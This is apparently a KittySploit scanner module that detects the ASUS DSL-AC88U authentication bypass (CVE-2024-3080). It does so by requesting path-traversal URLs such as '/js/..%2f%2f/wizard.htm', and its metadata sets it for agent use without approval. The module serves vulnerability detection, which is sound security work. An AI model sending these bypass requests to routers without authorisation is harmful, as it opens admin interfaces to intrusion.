#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability in the ASUS DSL-AC88U router permits unauthorized individuals to bypass authentication."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ASUS DSL-AC88U - Authentication Bypass Detection',
        'description': 'A vulnerability in the ASUS DSL-AC88U router permits unauthorized individuals to bypass authentication.When adding "/js/..%2f%2f" or "/images/..%2f%2e" to the requested URL, it will be recognized as passing the authentication.This vulnerability is part of a broader authentication bypass issue affecting multiple ASUS router models.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'asus', 'router', 'auth-bypass', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/Shuanunio/CVE_Requests/blob/main/ASUS/DSL-AC88U/ACL%20bypass%20Vulnerability%20in%20ASUS%20DSL-AC88U.md',
            'https://thehackernews.com/2024/06/asus-patches-critical-authentication.html',
            'https://nvd.nist.gov/vuln/detail/cve-2024-3080',
        ],
        'cve': 'CVE-2024-3080',
    }

    def run(self):
        for path in ('/js/..%2f%2f/wizard.htm', '/images/..%2f%2f/wizard.htm'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('show_wizardmenu();',)
            if (any(m in body for m in body_any)):
                self.set_info(
                    severity='critical',
                    reason="ASUS DSL-AC88U - Authentication Bypass detected",
                    path=path,
                )
                return True
        return False

